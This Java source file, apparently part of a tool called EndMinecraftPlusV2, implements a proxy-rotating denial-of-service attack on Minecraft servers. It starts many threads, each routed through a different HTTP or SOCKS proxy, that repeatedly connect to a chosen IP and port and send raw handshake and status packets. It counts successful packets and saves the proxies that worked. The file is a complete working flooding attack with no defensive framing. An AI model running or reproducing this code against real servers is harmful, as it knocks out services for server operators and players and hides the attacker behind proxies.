package cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
import org.spacehq.packetlib.Client;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class MotdAttackP extends IAttack {
    public List<Thread> threads = new ArrayList<>();
    public long starttime;
    private int runTimes = 0;
    private int successTimes = 0;
    private int errorTimes = 0;

    public MotdAttackP(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void start() {
        starttime = System.currentTimeMillis();

        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        while (true) {
            for (String p: ProxyUtil.proxies) {
                if (this.attack_maxconnect > 0 && (threads.size() > this.attack_maxconnect)) {
                    continue;
                }

                if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                    stop();
                    return;
                }

                try {
                    String[] _p = p.split(":");
                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                    Thread thread = createThread(proxy, ip, port);
                    thread.start();
                    thread.setName(String.valueOf(runTimes));
                    threads.add(thread);

                    new Thread(() -> {
                        OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                        if (thread.isAlive()) {
                            thread.stop();
                        }
                        threads.remove(thread);
                    }).start();
                } catch (Exception e) {
                    LogUtil.doLog(1,"发生错误: " + e, null);
                }
            }
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(Thread::stop);
    }

    public Thread createThread(Proxy proxy, String ip, int port) {
        if (!EndMinecraftPlusV2.isLinux) {
            SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - MotdAttack | 当前连接数: " + threads.size() + "个 | 发包次数: " + runTimes + "次 | 有效包数: " + successTimes + "次 | 错误次数: " + errorTimes);
        }
        runTimes++;
        Runnable task = () -> {
            try {
                Socket socket = new Socket(proxy);
                socket.connect(new InetSocketAddress(ip, port));

                while (socket.isConnected() && !socket.isClosed()) {
                    OutputStream out = socket.getOutputStream();
                    InputStream in = socket.getInputStream();
                    out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
                    out.flush();
                    out.write(new byte[] { 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                            0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00 });
                    out.flush();

                    byte[] buffer = new byte[12800];
                    if (in.read(buffer) != -1) {
                        LogUtil.doLog(0, "成功发送了Motd更新数据包。", "MotdAttack#" + Thread.currentThread().getName());
                        successTimes++;
                        if (ConfigUtil.SaveWorkingProxy) {
                            ProxyUtil.saveWorkingProxy(proxy);
                        }
                    }

                    socket.close();
                }

                OtherUtils.doSleep(attack_joinsleep);
            } catch (Throwable e) {
                if (ConfigUtil.ShowFails) {
                    LogUtil.doLog(0, "发生错误: " + e, "MotdAttackP#" + Thread.currentThread().getName());
                }
                errorTimes++;
            }
        };

        return new Thread(task);
    }
}
